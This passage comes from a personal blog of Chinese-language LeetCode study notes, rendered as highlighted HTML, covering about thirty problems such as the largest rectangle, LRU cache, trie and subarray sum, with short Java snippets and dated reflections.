class="number">4.</span>这道题解法的巧妙之处在于创建新数组new_heights，在原始数组左右两端各补一个<span class="number">0</span>。</span><br><span class="line"> <span class="type">int</span>[] new_heights = <span class="keyword">new</span> <span class="title class_">int</span>[heights.length + <span class="number">2</span>];</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; heights.length + <span class="number">1</span>; i++) &#123;</span><br><span class="line">     new_heights[i] = heights[i - <span class="number">1</span>];</span><br><span class="line">     &#125;</span><br><span class="line">这样做的好处是，能够省去很麻烦的边界判断：</span><br><span class="line">a.在前端补<span class="number">0</span>，使得第<span class="number">0</span>个元素有了左边界；</span><br><span class="line">b.在后端补<span class="number">0</span>，能避免由于输入数组是单调增，导致一直在压栈，只有出栈时有边界才会计算面积。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>本题是困难题，第一次接触单调栈，简直疯狂掉头发，希望能记住吧，弹栈有边界才更新面积。。。</span><br></pre></td></tr></table></figure><h2 id="70、爬楼梯（10月11日）"><a href="#70、爬楼梯（10月11日）" class="headerlink" title="70、爬楼梯（10月11日）"></a>70、爬楼梯（10月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>本题只需记住f(x)=f(x−<span class="number">1</span>)+f(x−<span class="number">2</span>)，因为对于这一阶台阶来说，可能是跨越一步上来的，也可能是跨越两步过来的：</span><br><span class="line">跨越一步上来时，f(x)和f(x-<span class="number">1</span>)的次数相同；跨越两步上来时，f(x)和f(x-<span class="number">2</span>)的次数相同，因此f(x)=f(x−<span class="number">1</span>)+f(x−<span class="number">2</span>)；</span><br><span class="line"><span class="number">2.</span>没啥说的，baby请你记住f(x)=f(x−<span class="number">1</span>)+f(x−<span class="number">2</span>)这个公式。爬楼梯啊爬楼梯~~~</span><br></pre></td></tr></table></figure><h2 id="46、全排列（10月17日）"><a href="#46、全排列（10月17日）" class="headerlink" title="46、全排列（10月17日）"></a>46、全排列（10月17日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题前面做过，一周没有刷题了手很生，看了题目只知道用回溯。实则全排列问题一定涉及交换，需要写swap辅助函数，此时本题就变简单了，只需维护index到达数组长度时放入结果，不到数组长度时index和后面每一个位置交换。</span><br></pre></td></tr></table></figure><h2 id="56、合并区间（10月17日）"><a href="#56、合并区间（10月17日）" class="headerlink" title="56、合并区间（10月17日）"></a>56、合并区间（10月17日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题前面也做过，甚至今天就用它优化了实验方案，但是又忘了该咋排序。解题逻辑是，双<span class="keyword">while</span>循环，每轮外围<span class="keyword">while</span>循环维护一个<span class="type">int</span>[] tmpResult，将其赋值为start区间，当下一区间和tmp区间产生交互时，将tmp区间右端更新为两者右端的最大值，并继续向右递进<span class="keyword">while</span>循环，直到不产生交互，将tmp区间放入结果，并从当前区间开展新一轮外层<span class="keyword">while</span>。</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]); <span class="comment">//这里需要注明类型</span></span><br></pre></td></tr></table></figure><h2 id="55、跳跃游戏（10月18日）"><a href="#55、跳跃游戏（10月18日）" class="headerlink" title="55、跳跃游戏（10月18日）"></a>55、跳跃游戏（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，贪心算法。贪心算法(又称贪婪算法)是指,在对问题求解时,总是做出在当前看来是最好的选择。这道题需要理解题意，对于序列[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>]而言，第<span class="number">0</span>个位置跨度为<span class="number">3</span>，能到第<span class="number">3</span>个位置，不会更远。因此从左到右遍历，每次更新能到达的最远位置，如果最远位置大于（nums.length - <span class="number">1</span>）,则为True；遍历到末尾，则为<span class="literal">false</span>。注意只有遍历i&lt;=maxValue时，才去更新maxValue。</span><br></pre></td></tr></table></figure><h2 id="78、子集（10月18日）"><a href="#78、子集（10月18日）" class="headerlink" title="78、子集（10月18日）"></a>78、子集（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯。这道题可能做过，做出来还是比较容易。思路就是，维护一个表示深度的变量index，当index没到达nums.length时，可以选择result不添加index位置的元素进行回溯，或者添加index位置的元素进行回溯，回溯结束后从result删除该元素。</span><br></pre></td></tr></table></figure><h2 id="96、不同的二叉搜索树（10月18日）"><a href="#96、不同的二叉搜索树（10月18日）" class="headerlink" title="96、不同的二叉搜索树（10月18日）"></a>96、不同的二叉搜索树（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题没啥说的，确实没思路。没写</span><br></pre></td></tr></table></figure><h2 id="98、验证二叉搜索树（10月18日）"><a href="#98、验证二叉搜索树（10月18日）" class="headerlink" title="98、验证二叉搜索树（10月18日）"></a>98、验证二叉搜索树（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题更新了我对二叉搜索树的认识，它不是单纯的根节点大于左子节点，小于右子节点，而且根节点要大于左子树的所有节点，小于右子树的所有节点。这样，中序遍历二叉搜索树时，一定得到单调升的结果。比如[<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line"><span class="number">5</span> - (<span class="number">4</span> <span class="number">6</span>)- ((<span class="literal">null</span> <span class="literal">null</span>) (<span class="number">3</span> <span class="number">7</span>))  <span class="comment">//其中右子树的节点3小于根节点5，所以不是二叉搜索树</span></span><br><span class="line">很自然想到，对于压栈的每个节点，要判断是否左节点小于它，再走到左节点；对于弹栈的每个节点，要判断是否右节点大于它，再走到右节点；此外，还要考虑到根节点<span class="number">5</span>大于很久以后的右节点<span class="number">3</span>这种情况，就很复杂。</span><br><span class="line">    当知道二叉树的中序遍历是单调升后，就可以省去以上判断，维护一个pre节点记录上次遍历到的有值节点，然后只判断是否单调升。</span><br><span class="line"> 此外，由于存在特殊测试用例，需要<span class="type">double</span> <span class="variable">preValue</span> <span class="operator">=</span> -Double.MAX_VALUE。</span><br></pre></td></tr></table></figure><h2 id="141、环形链表（10月18日）"><a href="#141、环形链表（10月18日）" class="headerlink" title="141、环形链表（10月18日）"></a>141、环形链表（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，快慢指针。这道题以前做过，稍微有点忘了，解法有两种：哈希表、快慢指针。用快慢指针做时，<span class="keyword">while</span>(slow!=fast)内部只需要在fast==<span class="literal">null</span>||fast.next==<span class="literal">null</span>为<span class="literal">true</span>时返回<span class="literal">false</span>，这样能保证fast.next.next能被访问到，那slow指针更能被访问到。</span><br></pre></td></tr></table></figure><h2 id="139、单词拆分（10月20日）"><a href="#139、单词拆分（10月20日）" class="headerlink" title="139、单词拆分（10月20日）"></a>139、单词拆分（10月20日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>最近做题陷入了怪圈，必须瞟眼答案关键字，有概率恍然大悟，然后遇到复杂的边界条件，总是差些火候写对，最终还是得看完整答案修修补补。比如这道题，我有经验设置<span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[s.length()+<span class="number">1</span>]; ，因为我知道<span class="number">0</span>位置不好对付就整体右移，但这时候边界条件又把我整怕了唉~</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，动态规划。设置子问题dp[i]表示前i个字符是否在wordDict中，从左到右遍历i，再从左到i遍历j，如果dp[j]为真且剩下到i的单词在wordDict中，则dp[i]为<span class="literal">true</span>。</span><br></pre></td></tr></table></figure><h2 id="142、环形链表Ⅱ（10月20日）"><a href="#142、环形链表Ⅱ（10月20日）" class="headerlink" title="142、环形链表Ⅱ（10月20日）"></a>142、环形链表Ⅱ（10月20日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashSet。从头开始遍历链表，将链表节点放入hashSet，如果hashSet中已经包含该节点，说明该节点是环的起始节点。</span><br><span class="line"><span class="number">2.</span>我的想法，快慢指针。快指针和慢指针相遇时，设从头到环入口的距离为a，环的周长为b，相遇位置与环入口距离为c，则快指针走过的路径长度为a+Xb+c，慢指针走过的路径长度为a+Yb+c，快慢指针的路径长度差值为b的整数倍。</span><br><span class="line">a+Xb+c = <span class="number">2</span>*(a+Yb+c)  =&gt;  a+c = (X-2Y)*b   <span class="comment">//环外的长度a + 未走满的部分b = 环周长的整数倍</span></span><br><span class="line">  求到这个有点闷，毕竟不知道确切多少倍，就无法得到周长。实际上，如果此时还有一个慢指针从起始点出发，他走距离a到达环入口，同时本慢指针从该点继续移动，也走距离a就能到达环入口，故这两个慢指针相遇点为环入口。</span><br><span class="line">    注意，写代码时外围 <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)，而不是<span class="keyword">while</span>(slow!=fast)，后者初始化时给slow、fast都赋值head不好做判断，且初始化为head.next、head.next.next会陷入无穷循环。</span><br></pre></td></tr></table></figure><h2 id="234、回文链表（10月20日）"><a href="#234、回文链表（10月20日）" class="headerlink" title="234、回文链表（10月20日）"></a>234、回文链表（10月20日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，快慢指针。先快慢指针找到链表中间，再将后半部分链表反转，再将前半部分和反转后的后半部分进行比较。</span><br><span class="line">    注意，快慢指针找链表中间需要dummy节点，这样能保证不管链表是单数还是双数，下一节点都是后半部分的起始节点。</span><br></pre></td></tr></table></figure><h2 id="283、移动零（10月21日）"><a href="#283、移动零（10月21日）" class="headerlink" title="283、移动零（10月21日）"></a>283、移动零（10月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，双指针。再次败北，麻了不说了。思路很简单，就是left指针指向已经处理好的序列，即最后一个非零树，右边指针一直向右遍历，如果该位置非零，则交换left、right指针指向的元素。</span><br></pre></td></tr></table></figure><h2 id="148、排序链表（10月21日）"><a href="#148、排序链表（10月21日）" class="headerlink" title="148、排序链表（10月21日）"></a>148、排序链表（10月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，优先队列。将链表节点放入最小堆priorityQueue，依次出堆后形成新链表。</span><br><span class="line"> PriorityQueue&lt;ListNode&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;(e1.val-e2.val));</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，归并排序。首先记住归并排序不是二分查找，是从左到右均分为长度<span class="number">2</span>的小段，排序后合并为长度<span class="number">4</span>的小段，重复此操作。本题的归并实现，是先用快慢指针找到链表中点，将前后两段排序后，再通过依次比较两个链表节点大小从而连接起来。</span><br><span class="line">    注意,这里递归是直接调用原函数sortList，需要在原函数判断<span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"><span class="comment">//没啥可说的，第二次用这个思路做，算是重写的时候快了点吧。</span></span><br></pre></td></tr></table></figure><h2 id="160、相交链表（10月21日）"><a href="#160、相交链表（10月21日）" class="headerlink" title="160、相交链表（10月21日）"></a>160、相交链表（10月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashSet。将链表headA的所有节点放入hashSet，遍历headB的节点，如果某节点在hashSet中已经存在，就返回该节点；如果循环结束，就返回<span class="literal">null</span>；</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，双指针。设链表headA非公共部分为a，链表headB非公共部分为b，链表公共部分为c，如果两个速度为<span class="number">1</span>的指针分别从headA、headB出发，则有：</span><br><span class="line">    a+c+b == b+c+a  <span class="comment">//即只有某指针走到末尾就切换赛道，必然会在下次c的起始节点相遇</span></span><br><span class="line">如果headA和headB不相交</span><br><span class="line">    a+<span class="number">0</span>+b = b+<span class="number">0</span>+a  <span class="comment">//即必然会在null相遇</span></span><br><span class="line"><span class="number">3.</span>这道题思路很多，归根结底是想解决掉链表headA和headB间的长度差值。</span><br></pre></td></tr></table></figure><h2 id="146、LRU缓存（10月22日）"><a href="#146、LRU缓存（10月22日）" class="headerlink" title="146、LRU缓存（10月22日）"></a>146、LRU缓存（10月22日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的思路，双项链表+hashMap。这道题需要维护双向链表节点head和tail，在初始化时连接两个节点如下。接下来不管put还是get操作，不能移动head和tail节点。</span><br><span class="line">    比如添加新节点到链表头部时，将新节点置为head，这是不对的，这会导致原始head节点（值为<span class="number">0</span>）被移动到链表中央。</span><br><span class="line">head.next = tail;</span><br><span class="line">tail.prev = head;</span><br><span class="line">当get或put操作一个已经存在的键时，需要从head.next开始遍历，直到tail结束寻找val为该键的链表节点，代码如下，这也是上面不能移动head和tail节点的原因：</span><br><span class="line">    <span class="type">DoubleNode</span> <span class="variable">temp</span> <span class="operator">=</span> head.next;</span><br><span class="line">    <span class="keyword">while</span>(temp!=tail)&#123;</span><br><span class="line">        <span class="keyword">if</span>(temp.val==key)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = temp.next;</span><br><span class="line">    &#125;</span><br><span class="line">此外，注意删除双向链表节点时指针和真实引用的区别即可。</span><br><span class="line">第二次做这道题，一直没敢做，以为还是做不出来，没想到调试着思路还挺流畅，再接再厉！！</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，双向链表+hashMap。官方题解中，hashMap定义如下：</span><br><span class="line">    Map&lt;Integer, DLinkedNode&gt; cache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, DLinkedNode&gt;();</span><br><span class="line">双向链表中存储<span class="type">int</span> key，<span class="type">int</span> value，很容易理解，能够通过键直接确定节点位置，从而省去<span class="keyword">while</span>循环。</span><br></pre></td></tr></table></figure><h2 id="169、多数元素（10月23日）"><a href="#169、多数元素（10月23日）" class="headerlink" title="169、多数元素（10月23日）"></a>169、多数元素（10月23日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap。维护一个hashMap记录每个数字的出现次数，最后遍历hashMap返回出现次数超过n/<span class="number">2</span>的数字。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，排序。由于只有一个多数元素，且出现次数超过n/<span class="number">2</span>，所以排序好后数组中间位置元素一定是该元素。</span><br><span class="line"><span class="number">3.</span>写了下冒泡排序，第二行<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums.length-<span class="number">1</span>-i;j++)，但显然这种数据不适合冒泡，比Arrays.sort(nums);慢太多。</span><br></pre></td></tr></table></figure><h2 id="287、寻找重复数（10月23日）"><a href="#287、寻找重复数（10月23日）" class="headerlink" title="287、寻找重复数（10月23日）"></a>287、寻找重复数（10月23日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashSet。维护一个hashSet存储已经访问过的数字，如果某数字再次出现，则hashSet中存在，返回该数字。</span><br><span class="line"><span class="comment">//这道题有二分查找、快慢指针等方法，且题目要求了O(1)的时间复杂度没办法，就这样吧思路有点特殊，不想深入。</span></span><br></pre></td></tr></table></figure><h2 id="208、实现前缀树（10月24日）"><a href="#208、实现前缀树（10月24日）" class="headerlink" title="208、实现前缀树（10月24日）"></a>208、实现前缀树（10月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，前缀树。这是第二次做这道题，本来以为TrieNode中维护“children = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">26</span>];”，但如何指向下一节点却犯了难，实则TrieNode定义代码如下，在children节点中的isWord字段记录其是否为单词，其他操作顺水推舟：</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">TrieNode</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> TrieNode[] children;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> isWord;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TrieNode</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.children = <span class="keyword">new</span> <span class="title class_">TrieNode</span>[<span class="number">26</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>前缀树主要用来实现字符串查找，解题的步骤有两步，第一步是创建前缀树，第二步是在前缀树中查找。这种题，需要熟悉TrieNode的定义、创建前缀树经典代码这两步惯性操作。</span><br></pre></td></tr></table></figure><h2 id="215、数组中第K个最大元素（10月24日）"><a href="#215、数组中第K个最大元素（10月24日）" class="headerlink" title="215、数组中第K个最大元素（10月24日）"></a>215、数组中第K个最大元素（10月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，最小堆。看到题目中第K个最大元素，就知道反过来要用最小堆，当堆大小超过K时，从堆顶弹出元素，直到所有元素经过堆处理，此时堆顶元素恰好为第K个最大元素。</span><br><span class="line">PriorityQueue&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1-e2);</span><br><span class="line"><span class="number">2.</span>我的想法，快速排序。手写快速排序是一个基本题目，需要注意以下函数配合：</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(end&gt;start)&#123;</span><br><span class="line">            <span class="comment">//调用getRandom，在mid两侧递归</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getRandom</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">randomNum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(end-start+<span class="number">1</span>)+start;</span><br><span class="line">       <span class="comment">//修改nums内容，将范围内的数组，根据比randomNum的大小放在其左右两边</span></span><br><span class="line">       <span class="comment">//方法是维护small指针，指向最后一个比randomNum小的元素，因此从start-1开始</span></span><br><span class="line">   这道题还是看了以前的笔记，因为快排还是容易忘，特点就是在随机数两边分治递归。幸运的是看着笔记还是一下做出来了，本题的方法是快速排序+二分查找。只是二分查找位置不再是<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        而是<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> getRandom(nums,left,right);</span><br></pre></td></tr></table></figure><h2 id="560、和为K的子数组（10月24日）"><a href="#560、和为K的子数组（10月24日）" class="headerlink" title="560、和为K的子数组（10月24日）"></a>560、和为K的子数组（10月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>做了半小时滑动窗口，以为胜利在望，发现数据里有负数，歪江难受得雅痞。</span><br><span class="line"><span class="number">2.</span>我的想法，暴力破解。两层<span class="keyword">for</span>循环击败<span class="number">5</span>%：</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;nums.length;j++)&#123;</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，前缀和+哈希表优化。上面的方法时间复杂度是O(n^<span class="number">2</span>)，但我们其实不需要通过遍历求每个数组的和，而是能通过前缀和计算出任意数组的和，假设pre[i]表示[<span class="number">0</span>,i]中所有数字的和，pre[j]表示[<span class="number">0</span>,j]中所有数字的和(i&lt;j)，那么</span><br><span class="line">    数组[i+<span class="number">1</span>,j] = pre[j] - pre[i];       <span class="comment">//pre[j] - pre[i] = k</span></span><br><span class="line">    这时候只要把前缀和都放到hashMap，每获得一个新pre，从hashMap中查找(pre-k)的键值。</span><br><span class="line">    注意，最开始时要“ hashMap.put(<span class="number">0</span>,<span class="number">1</span>); ”，因为<span class="number">0</span>位置以前的前缀和为<span class="number">0</span>也算一种情况，即该子数组从<span class="number">0</span>开始。</span><br><span class="line"><span class="number">4.</span>今天这几道题写得都挺好的，主要是以前的一些经典代码，不过还是需要提示关键逻辑才能再写出来。</span><br></pre></td></tr></table></figure><h2 id="394、字符串解码（10月25日）"><a href="#394、字符串解码（10月25日）" class="headerlink" title="394、字符串解码（10月25日）"></a>394、字符串解码（10月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归。这道题主要考察字符串相关api，以及递归的逻辑。我将dfs函数设计如下：</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[] charArray,<span class="type">int</span> start,StringBuilder builder)</span></span><br><span class="line">对于一段序列：</span><br><span class="line">a.如果是小写字母，直接加入builder；</span><br><span class="line">b.如果是数字，将其后的几个数字一起加入builder2，并将builder2转换为数字；dfs(charArray,i+<span class="number">1</span>,builder1);递归处理<span class="string">&#x27;[&#x27;</span>后面的字符串，并将builder1扩展n倍后加入本轮的builder，将i设置为dfs返回值，即递归<span class="string">&#x27;]&#x27;</span>的索引；</span><br><span class="line">    c.如果是<span class="string">&#x27;]&#x27;</span>，则<span class="keyword">return</span> i，说明本轮递归调用结束。</span><br><span class="line">这样的处理方法，是因为递归的dfs会返回<span class="string">&#x27;]&#x27;</span>的索引，从该索引位置继续遍历，直到遇到本轮的<span class="string">&#x27;]&#x27;</span>。</span><br><span class="line"><span class="number">2.</span>官方题解的简写代码（处理字符串中的连续整数）：</span><br><span class="line">    <span class="comment">//每个dfs维护一个整数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">multi</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//当遇到整数时，就构造完整的整数</span></span><br><span class="line"><span class="keyword">if</span>(s.charAt(i) &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;9&#x27;</span>) </span><br><span class="line">multi = multi * <span class="number">10</span> + Integer.parseInt(String.valueOf(s.charAt(i))); </span><br><span class="line"><span class="comment">//当递归的dfs返回，扩展递归的返回字符串时，就将该整数减回0，从而不用专门为整数构造builder2</span></span><br><span class="line"><span class="keyword">while</span>(multi &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            res.append(result1);</span><br><span class="line">            multi--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>字符串处理api记录复制：</span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(builder2.toString());  <span class="comment">//String转int</span></span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(charArray[i]));  <span class="comment">//char转int</span></span><br><span class="line">Character.isDigit(charArray[i]) <span class="comment">//判断char是否为数字</span></span><br><span class="line">Character.isLowerCase(charArray[i])<span class="comment">//判断char是否为小写字母</span></span><br></pre></td></tr></table></figure><h2 id="448、找到所有数组中消失的数字（10月25日）"><a href="#448、找到所有数组中消失的数字（10月25日）" class="headerlink" title="448、找到所有数组中消失的数字（10月25日）"></a>448、找到所有数组中消失的数字（10月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，HashSet。将nums中所有数字放入hashSet，再在“ <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;nums.length+<span class="number">1</span>;i++) ”范围里遍历，如果i不在hashSet中，就将i加入结果。</span><br><span class="line"><span class="number">2.</span>官方题解，原地修改。HashSet的存在是为了记录nums中的数字，由于nums的长度也为n，恰好能记录[<span class="number">1</span>,n]个数字，遍历数组时将遍历到的索引位置加n，则没遍历到的索引位置势必小于n，再次遍历找到该位置即可。时间复杂度 O(<span class="number">2</span>*n)=O(n)。</span><br><span class="line">    nums[(nums[i]-<span class="number">1</span>)%n] += n;   <span class="comment">//就是处理第一轮索引的情况，10%10-1=-1，但是(10-1)%10=9</span></span><br></pre></td></tr></table></figure><h2 id="155、最小栈（10月26日）"><a href="#155、最小栈（10月26日）" class="headerlink" title="155、最小栈（10月26日）"></a>155、最小栈（10月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，双栈。这道题思路很简单，我们最开始的想法是用一个minValue变量存储最小值，每当元素压栈时，就尝试更新最小值，但我们之所以不敢这么做，是因为如果弹栈元素恰好为最小值，那下一个最小值该是谁呢？优化这个思路的方法就是双栈，维护一个最小值栈，原始栈中的每个栈顶与最小值栈中的栈顶一一对应，原始栈弹栈同时也将最小值栈弹栈。</span><br><span class="line">（关键词，双栈对应）</span><br></pre></td></tr></table></figure><h2 id="234、回文链表（10月26日）"><a href="#234、回文链表（10月26日）" class="headerlink" title="234、回文链表（10月26日）"></a>234、回文链表（10月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，快慢指针+反转链表。今天要做研究，就挑个软柿子捏一捏。没啥说的，快慢指针时注意初值fast=slow=dummy，反转链表时注意维护prev、cur和temp三枚指针。</span><br></pre></td></tr></table></figure><h2 id="461、汉明距离（10月26日）"><a href="#461、汉明距离（10月26日）" class="headerlink" title="461、汉明距离（10月26日）"></a>461、汉明距离（10月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，按位运算。突然想到下面的方法，即比较x和y的每一位，相等时将最终结果result加一。</span><br><span class="line">    (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;   <span class="comment">//获取32位int型数字的每一位</span></span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，异或。x和y异或（x^y）后，获取结果的每一位并累加到result。</span><br></pre></td></tr></table></figure><h2 id="128、最长连续序列（10月27日）"><a href="#128、最长连续序列（10月27日）" class="headerlink" title="128、最长连续序列（10月27日）"></a>128、最长连续序列（10月27日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，排序。将数组nums排好序后，从左到右遍历，维护一个变量prev指向前一个访问的数字，如果本数字恰为前一个数字加一，则更新累积长度tmpValue；<span class="keyword">else</span> <span class="keyword">if</span>本数字不等于前一数字，更新最大累积长度，并将tmpValue恢复为初值<span class="number">1</span>。结束循环后还需要再更新一次最大累积长度，否则会漏掉最后的tmpValue。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，HashSet。<span class="keyword">for</span>(<span class="type">int</span> num:nums)遍历数组，将数字放入hashSet；再<span class="keyword">for</span>(<span class="type">int</span> num:nums)遍历数字，如果hashSet中不包含num-<span class="number">1</span>，说明是一个新序列，将prev初值设置为num，满足<span class="keyword">while</span>(hashSet.contains(prev+<span class="number">1</span>))的情况下，不断更新该序列长度。</span><br></pre></td></tr></table></figure><h2 id="226、反转二叉树（11月2日）"><a href="#226、反转二叉树（11月2日）" class="headerlink" title="226、反转二叉树（11月2日）"></a>226、反转二叉树（11月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，层序遍历二叉树。观察题意，其实操作并不复杂，就是交换每个节点的左、右子节点。经典的层序遍历二叉树，是通过维护队列和每层长度count实现的，这道题不需要分层，就按层序遍历时把节点可劲儿往队列里丢，弹出时再交换其左右子节点即可。只是指针变化。</span><br></pre></td></tr></table></figure><h2 id="338、比特位计数（11月5日）"><a href="#338、比特位计数（11月5日）" class="headerlink" title="338、比特位计数（11月5日）"></a>338、比特位计数（11月5日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，按位与。从<span class="number">0</span>到n遍历数字i，由于i为<span class="type">int</span>型，通过下面方法计数i中<span class="number">1</span>的个数，并将本轮结果放入results[i]。</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)result += (i&gt;&gt;j)&amp;<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="10、正则表达式匹配（11月7日）"><a href="#10、正则表达式匹配（11月7日）" class="headerlink" title="10、正则表达式匹配（11月7日）"></a>10、正则表达式匹配（11月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题太难了，看了很多遍题解都无法想通，就这样吧。</span><br></pre></td></tr></table></figure><h2 id="53、把二叉树搜索树转换为累加树（11月7日）"><a href="#53、把二叉树搜索树转换为累加树（11月7日）" class="headerlink" title="53、把二叉树搜索树转换为累加树（11月7日）"></a>53、把二叉树搜索树转换为累加树（11月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈实现后序遍历二叉树。完了我TM傻掉了，啊啊啊啊，后序遍历指的是中间节点最后访问，这个应该是反序中序遍历，怪不得重新看栈实现后序遍历这么迷。</span><br><span class="line"><span class="number">2.</span>思路<span 